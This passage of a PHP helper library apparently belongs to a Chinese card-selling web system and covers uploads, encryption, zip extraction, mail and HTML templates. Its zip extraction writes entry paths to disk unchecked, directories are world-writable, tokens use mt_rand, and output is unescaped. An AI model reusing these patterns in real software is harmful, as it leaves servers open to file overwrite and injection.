    if (!move_uploaded_file($filename, $destination)) {
        return null;
        exit;
    }

    $pinfo = pathinfo($destination);
    $fname = $pinfo['basename'];
    return $f . $fname; //成功！


    if ($watermark == 1) {
        $iinfo = getimagesize($destination, $iinfo);
        $nimage = imagecreatetruecolor($image_size[0], $image_size[1]);
        $white = imagecolorallocate($nimage, 255, 255, 255);
        $black = imagecolorallocate($nimage, 0, 0, 0);
        $red = imagecolorallocate($nimage, 255, 0, 0);
        imagefill($nimage, 0, 0, $white);
        switch ($iinfo[2]) {
            case 1:
                $simage = imagecreatefromgif($destination);
                break;
            case 2:
                $simage = imagecreatefromjpeg($destination);
                break;
            case 3:
                $simage = imagecreatefrompng($destination);
                break;
            case 6:
                $simage = imagecreatefromwbmp($destination);
                break;
            default:
                return "不支持的文件类型";
                exit;
        }

        imagecopy($nimage, $simage, 0, 0, 0, 0, $image_size[0], $image_size[1]);
        imagefilledrectangle($nimage, 1, $image_size[1] - 15, 80, $image_size[1], $white);

        switch ($watertype) {
            case 1:   //加水印字符串
                imagestring($nimage, 2, 3, $image_size[1] - 15, $waterstring, $black);
                break;
            case 2:   //加水印图片
                $simage1 = imagecreatefromgif("xplore.gif");
                imagecopy($nimage, $simage1, 0, 0, 0, 0, 85, 15);
                imagedestroy($simage1);
                break;
        }

        switch ($iinfo[2]) {
            case 1:
                imagejpeg($nimage, $destination);
                break;
            case 2:
                imagejpeg($nimage, $destination);
                break;
            case 3:
                imagepng($nimage, $destination);
                break;
            case 6:
                imagewbmp($nimage, $destination);
                break;
        }
        imagedestroy($nimage);
        imagedestroy($simage);
    }
}

function strexists($string, $find) {
    return !(strpos($string, $find) === FALSE);
}

function dstrpos($string, $arr) {
    if (empty($string))
        return false;
    foreach ((array) $arr as $v) {
        if (strpos($string, $v) !== false) {
            return true;
        }
    }
    return false;
}

function sendemail($to, $content = "欢迎使用SAF个人发卡系统！") {
    global $conf;
    include SYSTEM_ROOT . 'smtp.class.php';
    $ssl = $conf['mail_port'] == 465 ? true : false;
    $x = new SMTP($conf['mail_stmp'], $conf['mail_port'], true, $conf['mail_name'], $conf['mail_pwd'], $ssl);
    $a = $x->send($to, $conf['mail_name'], $conf['mail_title'], $content, $conf['title']);
    return $a;
}

function checkmobile() {
    $useragent = strtolower($_SERVER['HTTP_USER_AGENT']);
    $ualist = array('android', 'midp', 'nokia', 'mobile', 'iphone', 'ipod', 'blackberry', 'windows phone');
    if ((dstrpos($useragent, $ualist) || strexists($_SERVER['HTTP_ACCEPT'], "VND.WAP") || strexists($_SERVER['HTTP_VIA'], "wap"))) {
        return true;
    } else {
        return false;
    }
}

function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
    $ckey_length = 4;
    $key = md5($key ? $key : ENCRYPT_KEY);
    $keya = md5(substr($key, 0, 16));
    $keyb = md5(substr($key, 16, 16));
    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : '';
    $cryptkey = $keya . md5($keya . $keyc);
    $key_length = strlen($cryptkey);
    $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;
    $string_length = strlen($string);
    $result = '';
    $box = range(0, 255);
    $rndkey = array();
    for ($i = 0; $i <= 255; $i++) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
    }
    for ($j = $i = 0; $i < 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }
    for ($a = $j = $i = 0; $i < $string_length; $i++) {
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }
    if ($operation == 'DECODE') {
        if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) {
            return substr($result, 26);
        } else {
            return '';
        }
    } else {
        return $keyc . str_replace('=', '', base64_encode($result));
    }
}

function zipExtract($filename, $path) {
    if (!file_exists($filename)) {
        die("文件 $filename 不存在！");
    }
    $starttime = explode(' ', microtime());
    $filename = iconv("utf-8", "gb2312", $filename);
    $path = iconv("utf-8", "gb2312", $path);
    $resource = zip_open($filename);
    $i = 1;
    while ($dir_resource = zip_read($resource)) {
        if (zip_entry_open($resource, $dir_resource)) {
            $file_name = $path . zip_entry_name($dir_resource);
            $file_path = substr($file_name, 0, strrpos($file_name, "/"));
            if (!is_dir($file_path)) {
                mkdir($file_path, 0777, true);
            }
            if (!is_dir($file_name)) {
                $file_size = zip_entry_filesize($dir_resource);
                if ($file_size < (1024 * 1024 * 6)) {
                    $file_content = zip_entry_read($dir_resource, $file_size);
                    file_put_contents($file_name, $file_content);
                } else {
                    return false;
                }
            }
            //关闭当前
            zip_entry_close($dir_resource);
        }
    }
    zip_close($resource);
    $endtime = explode(' ', microtime());
    $thistime = $endtime[0] + $endtime[1] - ($starttime[0] + $starttime[1]);
    $thistime = round($thistime, 3);
    return true;
    ;
}

function random($length, $numeric = 0) {
    $seed = base_convert(md5(microtime() . $_SERVER['DOCUMENT_ROOT']), 16, $numeric ? 10 : 35);
    $seed = $numeric ? (str_replace('0', '', $seed) . '012340567890') : ($seed . 'zZ' . strtoupper($seed));
    $hash = '';
    $max = strlen($seed) - 1;
    for ($i = 0; $i < $length; $i++) {
        $hash .= $seed{mt_rand(0, $max)};
    }
    return $hash;
}

function makeDir($dir, $mode = "0777") {
    if (!$dir)
        return false;
    if (!file_exists($dir)) {
        return mkdir($dir, $mode, true);
    } else {
        return true;
    }
}

function saveFile($fileName, $text) {
    if (!$fileName || !$text)
        return false;
    if (makeDir(dirname($fileName))) {
        if ($fp = fopen($fileName, "w")) {
            if (@fwrite($fp, $text)) {
                fclose($fp);
                return true;
            } else {
                fclose($fp);
                return false;
            }
        }
    }
    return false;
}

function showmsg($content = '未知的异常', $type = 4, $back = false) {
    switch ($type) {
        case 1:
            $panel = "success";
            break;
        case 2:
            $panel = "info";
            break;
        case 3:
            $panel = "warning";
            break;
        case 4:
            $panel = "danger";
            break;
    }

    echo '<div class="panel panel-' . $panel . '">
      <div class="panel-heading">
        <h3 class="panel-title">提示信息</h3>
        </div>
        <div class="panel-body">';
    echo $content;

    if ($back) {
        echo '<hr/><a href="' . $back . '"><< 返回上一页</a>';
    } else
        echo '<hr/><a href="javascript:history.back(-1)"><< 返回上一页</a>';

    echo '</div>
    </div>';
    exit;
}

function sysmsg($msg = '未知的异常', $die = true) {
    ?>  
    <!DOCTYPE html>
    <html xmlns="http://www.w3.org/1999/xhtml" lang="zh-CN">
        <head>
            <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>站点提示信息</title>
                <style type="text/css">
                    html{background:#eee}body{background:#fff;color:#333;font-family:"微软雅黑","Microsoft YaHei",sans-serif;margin:2em auto;padding:1em 2em;max-width:700px;-webkit-box-shadow:10px 10px 10px rgba(0,0,0,.13);box-shadow:10px 10px 10px rgba(0,0,0,.13);opacity:.8}h1{border-bottom:1px solid #dadada;clear:both;color:#666;font:24px "微软雅黑","Microsoft YaHei",,sans-serif;margin:30px 0 0 0;padding:0;padding-bottom:7px}#error-page{margin-top:50px}h3{text-align:center}#error-page p{font-size:9px;line-height:1.5;margin:25px 0 20px}#error-page code{font-family:Consolas,Monaco,monospace}ul li{margin-bottom:10px;font-size:9px}a{color:#21759B;text-decoration:none;margin-top:-10px}a:hover{color:#D54E21}.button{background:#f7f7f7;border:1px solid #ccc;color:#555;display:inline-block;text-decoration:none;font-size:9px;line-height:26px;height:28px;margin:0;padding:0 10px 1px;cursor:pointer;-webkit-border-radius:3px;-webkit-appearance:none;border-radius:3px;white-space:nowrap;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;-webkit-box-shadow:inset 0 1px 0 #fff,0 1px 0 rgba(0,0,0,.08);box-shadow:inset 0 1px 0 #fff,0 1px 0 rgba(0,0,0,.08);vertical-align:top}.button.button-large{height:29px;line-height:28px;padding:0 12px}.button:focus,.button:hover{background:#fafafa;border-color:#999;color:#222}.button:focus{-webkit-box-shadow:1px 1px 1px rgba(0,0,0,.2);box-shadow:1px 1px 1px rgba(0,0,0,.2)}.button:active{background:#eee;border-color:#999;color:#333;-webkit-box-shadow:inset 0 2px 5px -3px rgba(0,0,0,.5);box-shadow:inset 0 2px 5px -3px rgba(0,0,0,.5)}table{table-layout:auto;border:1px solid #333;empty-cells:show;border-collapse:collapse}th{padding:4px;border:1px solid #333;overflow:hidden;color:#333;background:#eee}td{padding:4px;border:1px solid #333;overflow:hidden;color:#333}
                </style>
        </head>
        <body id="error-page" style="text-align: center;">
    <?php
    echo '<h3>提示信息</h3>';


    echo $msg;
    echo '<br><br><small>当前时间: ' . date("Y-m-d H:i:s") . '</small>';
    ?>
        </body>
    </html>
    <?php
    if ($die == true) {
        exit;
    }
}

function in($dir) {
    $dh = opendir($dir);
    while ($file = readdir($dh)) {
        if ($file != "." && $file != "..") {
            $fullpath = $dir . "/" . $file;
            if (!is_dir($fullpath)) {
                unlink($fullpath);
            } else {
                deldir($fullpath);
            }
        }
    }
    closedir($dh);
    if (rmdir($dir)) {
        return true;
    } else {
        return false;
    }
}

//QQ昵称获取
function get_qqnick($uin) {
    if ($data = file_get_contents("http://users.qzone.qq.com/fcg-bin/cgi_get_portrait.fcg?get_nick=1&uins=" . $uin)) {
        $data = str_replace(array(
            'portraitCallBack(',
            ')'
                ), array(
            '',
            ''
                ), $data);
        $data = mb_convert_encoding($data, "UTF-8", "GBK");
        $row = json_decode($data, true);
        ;
        return $row[$uin][6];
    }
}

function checkIfActive($string) {
    $array = explode(',', $string);
    $php_self = substr($_SERVER['REQUEST_URI'], strrpos($_SERVER['REQUEST_URI'], '/') + 1, strrpos($_SERVER['REQUEST_URI'], '.') - strrpos($_SERVER['REQUEST_URI'], '/') - 1);
    if (in_array($php_self, $array)) {
        return 'active';
    } else
        return null;
}

function serverhost() {
    if (substr_count($_SERVER['HTTP_HOST'], ".") == 1) {
        $_SERVER['HTTP_HOST'] = "www." . $_SERVER['HTTP_HOST'];
    }
    return $_SERVER['HTTP_HOST'];
}

//if(empty($_SESSION['user_cookies'])) coreverification();
function getMd_df($goal, $content, $foot, $fromName) {

    $ym = $_SERVER['HTTP_HOST'];
    $txt = '<meta http-equiv="Content-Type" Content="text/html;charset=utf8"/><div class="qmbox qm_con_body_content" id="mailContentContainer">
<style type="text/css">.qmbox body,.qmbox #bodyTable,.qmbox #bodyCell{ height: 100% !important; margin: 0; padding: 0; width: 100% !important;}.qmbox table { border-collapse: collapse; }.qmbox img,.qmbox a img{ border: 0; outline: none; text-decoration: none; }.qmbox h1,.qmbox h2,.qmbox h3,.qmbox h4,.qmbox h5,.qmbox h6{ margin: 0; padding: 0; }.qmbox p { margin: 1em 0; padding: 0; }.qmbox a { word-wrap: break-word; }.qmbox .ReadMsgBody { width: 100%; }.qmbox .ExternalClass { width: 100%; }.qmbox .ExternalClass,.qmbox .ExternalClass p,.qmbox .ExternalClass span,.qmbox .ExternalClass font,.qmbox .ExternalClass td,.qmbox .ExternalClass div{ line-height: 100%; }.qmbox table,.qmbox td{ mso-table-lspace: 0pt; mso-table-rspace: 0pt; }.qmbox #outlook a { padding: 0; }.qmbox img { -ms-interpolation-mode: bicubic; }.qmbox body,.qmbox table,.qmbox td,.qmbox p,.qmbox a,.qmbox li,.qmbox blockquote{ -ms-text-size-adjust: 100%; -webkit-text-size-adjust: 100%; }.qmbox #bodyCell { padding: 20px; }.qmbox .image { vertical-align: bottom; }.qmbox .textContent img { height: auto !important; }.qmbox body,.qmbox #bodyTable{ background-color: #F2F2F2; }.qmbox #bodyCell { border-top: 0; }.qmbox h1 { color: #606060 !important; display: block; font-family: Helvetica; font-size: 40px; font-style: normal; font-weight: bold; line-height: 125%; letter-spacing: -1px; margin: 0; text-align: left; }.qmbox h2 { color: #404040 !important; display: block; font-family: Helvetica; font-size: 26px; font-style: normal; font-weight: bold; line-height: 125%; letter-spacing: -.75px; margin: 0; text-align: left; }.qmbox h3 { color: #606060 !important; display: block; font-family: Helvetica; font-size: 18px; font-style: normal; font-weight: bold; line-height: 125%; letter-spacing: -.5px; margin: 0; text-align: left; }.qmbox h4 { color: #808080 !important; display: block; font-family: Helvetica; font-size: 16px; font-style: normal; font-weight: bold; line-height: 125%; letter-spacing: normal; margin: 0; text-align: left; }.qmbox #templatePreheader { background-color: #FFFFFF; border-top: 0; border-bottom: 0; }.qmbox .preheaderContainer .textContent,.qmbox .preheaderContainer .textContent p{ color: #606060; font-family: Helvetica; font-size: 11px; line-height: 125%; text-align: left; }.qmbox .preheaderContainer .textContent a { color: #606060; font-weight: normal; text-decoration: underline; }.qmbox #templateHeader { background-color: #FFFFFF; border-top: 0; border-bottom: 0; }.qmbox .headerContainer .textContent,.qmbox .headerContainer .textContent p{ color: #606060; font-family: Helvetica; font-size: 15px; line-height: 150%; text-align: left; }.qmbox .headerContainer .textContent a { color: #6DC6DD; font-weight: normal; text-decoration: underline; }.qmbox #templateBody { background-color: #FFFFFF; border-top: 0; border-bottom: 0; }.qmbox .bodyContainer .textContent,.qmbox .bodyContainer .textContent p{ color: #606060; font-family: Helvetica; font-size: 15px; line-height: 150%; text-align: left; }.qmbox .bodyContainer .textContent a { color: #6DC6DD; font-weight: normal; text-decoration: underline; }.qmbox #templateColumns { background-color: #FFFFFF; border-top: 0; border-bottom: 0; }.qmbox .imageContent img { vertical-align: middle; max-width: 100%; }.qmbox .leftColumnContainer .textContent,.qmbox .leftColumnContainer .textContent p{ color: #606060; font-family: Helvetica; font-size: 15px; line-height: 150%; text-align: left; }.qmbox .leftColumnContainer .textContent a { color: #6DC6DD; font-weight: normal; text-decoration: underline; }.qmbox .centerColumnContainer .textContent,.qmbox .centerColumnContainer .textContent p{ color: #606060; font-family: Helvetica; font-size: 15px; line-height: 150%; text-align: left; }.qmbox .centerColumnContainer .textContent a { color: #6DC6DD; font-weight: normal; text-decoration: underline; }.qmbox .rightColumnContainer .textContent,.qmbox .rightColumnContainer .textContent p{ color: #606060; font-family: Helvetica; font-size: 15px; line-height: 150%; text-align: left; }.qmbox .rightColumnContainer .textContent a { color: #6DC6DD; font-weight: normal; text-decoration: underline; }.qmbox #templateFooter { background-color: #F2F2F2; border-top: 0; border-bottom: 0; }.qmbox .footerContainer .textContent,.qmbox .footerContainer .textContent p{ color: #606060; font-family: Helvetica; font-size: 11px; line-height: 125%; text-align: left; }.qmbox .footerContainer .textContent a { color: #606060; font-weight: normal; text-decoration: underline; }
</style>
<center>
<table align="center" border="0" cellpadding="0" cellspacing="0" height="100%" id="bodyTable" width="100%">
	<tbody>
		<tr>
			<td align="center" id="bodyCell" valign="top">
			<table border="0" cellpadding="0" cellspacing="0" id="templateContainer" width="600">
				<tbody>
					<tr>
						<td align="center" valign="top">
						<table border="0" cellpadding="0" cellspacing="0" id="templatePreheader" width="100%">
							<tbody>
								<tr>
									<td align="center" valign="top">
									<table border="0" cellpadding="0" cellspacing="0" class="templateContainer" width="600">
										<tbody>
											<tr>
												<td class="preheaderContainer tpl-container dragTarget" data-container="preheader" valign="top">
												<div class="tpl-block tpl-image" style="margin-top: 0px; margin-bottom: 0px; border: 0px solid rgb(0, 0, 0); border-radius: 0px;">
												<div data-attach-point="containerNode">
												<table border="0" cellpadding="0" cellspacing="0" class="imageBlock" width="100%">
													<tbody class="imageBlockOuter">
														<tr>
															<td class="imageBlockInner" valign="top">
															<table align="left" border="0" cellpadding="0" cellspacing="0" class="imageContentContainer" width="100%">
																<tbody>
																	<tr>
																		<td align="center" class="imageContent" style="padding: 10px; text-align: -webkit-center; background-color: rgb(255, 255, 255);" valign="top"><img src="http://' . $ym . '/assets/imgs/EM.jpg" /></td>
																	</tr>
																</tbody>
															</table>
															</td>
														</tr>
													</tbody>
												</table>
												</div>
												</div>
												</td>
											</tr>
										</tbody>
									</table>
									</td>
								</tr>
							</tbody>
						</table>
						</td>
					</tr>
					<tr>
						<td align="center" valign="top">
						<table border="0" cellpadding="0" cellspacing="0" id="templateHeader" width="100%">
							<tbody>
								<tr>
									<td align="center" valign="top">
									<table border="0" cellpadding="0" cellspacing="0" class="templateContainer" width="600">
										<tbody>
											<tr>
												<td class="headerContainer tpl-container dragTarget" data-container="header" valign="top">
												<div class="block tpl-block text-block" style="">
												<div data-attach-point="containerNode">
												<table border="0" cellpadding="0" cellspacing="0" class="textBlock" width="100%">
													<tbody class="textBlockOuter">
														<tr>
															<td class="textBlockInner" valign="top">
															<table align="left" border="0" cellpadding="0" cellspacing="0" class="textContentContainer" width="600">
																<tbody>
																	<tr>
																		<td class="textContent" style="padding-top:9px; padding-right: 18px; padding-bottom: 9px; padding-left: 18px;background-color:#ffffff" valign="top">
																		<div style="box-sizing: border-box; margin: 0px 0px 10px; font-family: "Microsoft YaHei", Helvetica, Arial, sans-serif; font-size: 14px; line-height: 20px;">
																		<p>尊敬的：' . $goal . '</p>
																		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>' . $content . '</strong>

																		</div>
																		</td>
																	</tr>
																</tbody>
															</table>
															</td>
														</tr>
													</tbody>
												</table>
												</div>
												</div>

												<div class="tpl-block tpl-text" style="margin-top: 0px; margin-bottom: 0px; border: 0px solid rgb(0, 0, 0); border-radius: 0px;">
												<div data-attach-point="containerNode">
												<table border="0" cellpadding="0" cellspacing="0" class="textBlock" width="100%">
													<tbody class="textBlockOuter">
														<tr>
															<td class="textBlockInner" valign="top">
															<table align="left" border="0" cellpadding="0" cellspacing="0" class="textContentContainer" width="100%">
																<tbody>
																	<tr>
																		<td align="center" class="textContent" style="padding: 10px 0px; text-align: left; background: rgb(255, 255, 255);" valign="top">
																		<div style="text-align: right;padding-right:80px;"><strong><span style="color:#317bcf;"><span style="font-family:microsoft yahei;">' . $fromName . '</span></span></strong></div>
																		</td>
																	</tr>
																</tbody>
															</table>
															</td>
														</tr>
													</tbody>
												</table>
												</div>
												</div>
												</td>
											</tr>
										</tbody>
									</table>
									</td>
								</tr>
							</tbody>
						</table>
						</td>
					</tr>
					<tr>
						<td align="center" valign="top">
						<table border="0" cellpadding="0" cellspacing="0" id="templateBody" width="100%">
							<tbody>
								<tr>
									<td align="center" valign="top">
									<table border="0" cellpadding="0" cellspacing="0" class="templateContainer" width="600">
										<tbody>
											<tr>
												<td class="bodyContainer tpl-container dragTarget" data-container="body" valign="top">
												<div class="ghost-source">&nbsp;</div>

												<div class="tpl-block tpl-divider" style="margin-top: 0px; margin-bottom: 0px; border: 0px solid rgb(0, 0, 0); border-radius: 0px;">
												<div data-attach-point="containerNode">
												<table border="0" cellpadding="0" cellspacing="0" class="dividerBlock" width="100%">
													<tbody class="dividerBlockOuter">
														<tr>
															<td class="dividerBlockInner">
															<table border="0" cellpadding="0" cellspacing="0" class="dividerContentContainer" width="100%">
																<tbody>
																	<tr>
																		<td align="center" class="dividerContent" style="margin-top: 10px; margin-bottom: 15px; padding: 10px 20px; text-align: start; background-color: rgb(255, 255, 255);">
																		<div style="width:100%;height:1px;background: rgb(153, 153, 153);">&nbsp;</div>
																		</td>
																	</tr>
																</tbody>
															</table>
															</td>
														</tr>
													</tbody>
												</table>
												</div>
												</div>
												</td>
											</tr>
										</tbody>
									</table>
									</td>
								</tr>
							</tbody>
						</table>
						</td>
					</tr>
					<tr>
						<td align="center" valign="top">
						<table border="0" cellpadding="0" cellspacing="0" id="templateFooter" width="100%">
							<tbody>
								<tr>
									<td align="center" valign="top">
									<table border="0" cellpadding="0" cellspacing="0" class="templateContainer" width="600">
										<tbody>
											<tr>
												<td class="footerContainer tpl-container dragTarget" data-container="footer" valign="top">
												<div class="block tpl-block text-block">
												<div data-attach-point="containerNode">
												<table border="0" cellpadding="0" cellspacing="0" class="textBlock" width="100%">
													<tbody class="textBlockOuter">
														<tr>
															<td class="textBlockInner" valign="top">
															<table align="left" border="0" cellpadding="0" cellspacing="0" class="textContentContainer" width="600">
																<tbody>
																	<tr>
																		<td class="textContent" style="padding-top:9px; padding-right: 18px; padding-bottom: 9px; padding-left: 18px;background-color:#ffffff" valign="top">
																		<div style="line-height: 20.7999992370605px; text-align: center;"><span style="font-family: "microsoft yahei";">系统邮件，请勿回复</span></div>

																		<div style="line-height: 20.7999992370605px; text-align: center;"><span style="font-family: "microsoft yahei";">Copyright &copy; ' . date('Y') . '&nbsp;' . $foot . ' &nbsp;All rights reserved.</span></div>
																		</td>
																	</tr>
																</tbody>
															</table>
															</td>
														</tr>
													</tbody>
												</table>
												</div>
												</div>
												</td>
											</tr>
										</tbody>
									</table>
									</td>
								</tr>
							</tbody>
						</table>
						</td>
					</tr>
				</tbody>
			</table>
			</td>
		</tr>
	</tbody>
</table>
</center>
</div>
';
    return $txt;
}
?>